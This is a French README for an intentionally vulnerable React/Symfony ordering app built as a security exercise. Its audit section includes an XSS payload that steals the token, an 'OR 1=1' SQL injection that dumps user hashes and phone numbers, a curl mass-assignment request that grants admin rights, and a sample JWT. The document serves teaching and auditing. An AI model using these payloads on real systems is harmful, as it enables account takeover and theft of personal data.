## Application Test Product

Application simple de commande de produits divers

- L'utilisateur crée son compte puis peut commander des produits, commandes qu'il peut supprimer à tout moment
- L'admin peut créer des produits supplémentaires et a accès aux commandes de tous les utilisateurs

# Installation et lancement

1- Clôner le projet git : https://github.com/HammerKick/securite-web
2- Sur postgreSQL, créer la base de données et coller son URL dans .env (DATABASE_URL)
3- Générer la clé JWT secrète par le moyen de votre choix puis la coller dans .env (JWT_SECRET)
4- Dans le dossier du projet, cd test-api
5- symfony server:start
6- cd ..
7- cd test-product
8- npm run dev
9- Créez deux comptes utilisateur : test1@gmail.com et test2@gmail.com
10- Créez un compte admin admin@gmail.com avec la checkbox Admin (pour les tests)

# Comptes de test

A créer à l'initialisation de l'application :

- test1@gmail.com, mdp : 123
- test2@gmail.com, mdp : 123
- admin@gmail.com, mdp : admin - cocher la case Admin à l'inscription

# Git

Le front et le back se trouvent dans le même repo :

- test-product est le front end en React Vite Typescript
- test-api est le back end, une API Rest Symfony

2 branches :

- vulnerable : l'application avec les failles de sécurité
- secure : l'application avec les correctifs de sécurité

# Vulnérabilités intégrées

- Broken Access Control : un utilisateur peut avoir l'info de toutes les commandes via les DevTools
- XSS : un champ de texte pour laisser un commentaire vis à vis d'un profil peut exécuter du JavaScript
- Injection SQL : il est possible de récupérer toutes les infos des diverses tables, notamment les commandes avec une injection SQL
- Mass Assignment : il est possible de se donner le rôle administrateur via une commande spécifique
- Information Disclosure : le mot de passe au login et à l'inscription apparaît en clair et les numéros de téléphone des users sont disponibles si on fouille un peu, notamment dans le token JWT
- Token stocké en localStorage

# Audit détaillé

- Broken Access Control :
  L'endpoint http://127.0.0.1:8000/order en GET envoie toutes les données possibles et imaginables, un utilisateur non admin ne doit voir que ses propres commandes
  Si on entre dans les DevTools et qu'on regarde la réponse de l'endpoint order, on retrouve toutes les commandes existantes et pas que celles de l'utilisateur, ce qui implique que le backend ne filtre pas les commandes en fonction de quel non-admin est connecté (voir broken-access-control.png à la racine du projet)
- XSS : le champ commentaire autorise du JavaScript, par exemple avec <img src=x onerror="document.title='Pwned: ' + localStorage.getItem('token')"> on peut se mettre dans le titre le token d'authentification et récupérer les infos (voir xss-injection à la racine)
- Injection SQL : avec php bin/console dbal:run-sql 'SELECT \* FROM \"order\" WHERE id = 1 OR 1=1'
  On obtient :
  ***
  id date user_id_id product_id
  ***
  21 2026-07-09 08:14:56 4 15
  22 2026-07-09 08:14:56 4 17
  23 2026-07-09 08:15:06 5 15
  24 2026-07-09 08:15:07 5 15
  ***
  C'est déjà un souci de voir toutes les commandes, d'autant plus qu'on obtient des user ID qui peuvent servir à récupérer leurs infos

Surtout, on peut faire :
PS C:\Users\toito\Desktop\Dev\API Symfony Test\test-api> php bin/console dbal:run-sql 'SELECT \* FROM public."user" WHERE "id" = 1 OR 1=1'

---

id email roles password phone_number

---

1 toitoinne@gmail.com ["ROLE_USER"] $2y$13$c7OMhz4cgpOcf2j.GbUq2.w6HNa9x63BZ8w0LfyIWfz6/TaLJsMZG 0694960248
2 test3@gmail.com ["ROLE_USER"] $2y$13$djRpDMp6xpNMua7bxjTrI.ZPQ40GmdKb3Q2l3EeYUL30f1hqKeAry 0731881633
3 aa@gmail.com ["ROLE_USER"] $2y$13$gl9SdY.lVSOonBFbcx0ZaODdLZJjev7nzu.Co9kyspHoaYmeqFXTi 0721658987
5 test2@gmail.com ["ROLE_USER"] $2y$13$M5/lUOnZZQsjtm5XWAjPauHzo/kDXVfEFc9HsF3cGJSeeNiyW6Sja 0650633718
6 admin@gmail.com ["ROLE_USER","ROLE_ADMIN"] $2y$13$RSq0NsWnZ1dxOiw3XV5JdutWA/LWmupeb5.q4luFYyFix6JVXUJT. 0743668018
4 test1@gmail.com ["ROLE_USER"] $2y$13$8dlLuhOvu9m1L5JV4mX.LubLWw3WOlzcHSjNC7iwa82DuDhS5Ng0S 0608376128

---

Bon le mot de passe est chiffré au moins... par contre on récupère les numéros de téléphone, une information sensible

- Information Disclosure : pour rebondir sur le point précédent, récupérer les numéros de téléphone est extrêmement simple. Les mots de passe apparaissent en clair quand on se log ce qui est un énorme souci. Au moins le backend les chiffre mais si on arrive à intercepter la requête, on obtient le mot de passe en clair.
  Le token JWT contient également ce numéro de téléphone :
  {
  "iat": 1783589984,
  "exp": 1783593584,
  "sub": 6,
  "email": "admin@gmail.com",
  "roles": [
  "ROLE_USER",
  "ROLE_ADMIN"
  ],
  "phoneNumber": "0743668018"
  }

D'ailleurs...

- Token stocké en localStorage : récupérable très simplement dans les DevTools, pas grand chose à ajouter mais c'est évidemment une vulnérabilité à ne pas laisser de côté

- Mass assignment : n'importe quel utilisateur peut se donner le rôle admin avec un curl simple
  curl -i -X PUT http://127.0.0.1:8000/api/users/4 \
   -H "Content-Type: application/json" \
   -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3ODM1ODU1MDcsImV4cCI6MTc4MzU4OTEwNywic3ViIjo0LCJlbWFpbCI6InRlc3QxQGdtYWlsLmNvbSIsInJvbGVzIjpbIlJPTEVfVVNFUiJdfQ.njlnw5J3zh4mdaQhHY7PoYRRi1lP9i2PY02bC_BKS9U" \
   -d '{"roles": ["ROLE_ADMIN"]}'

  Le résultat : un 200 qui ajoute le rôle admin à l'utilisateur, ce qui lui donne accès aux commandes admin de création de produit, à la liste complète des commandes sur l'interface mais aussi aux infos utilisateurs
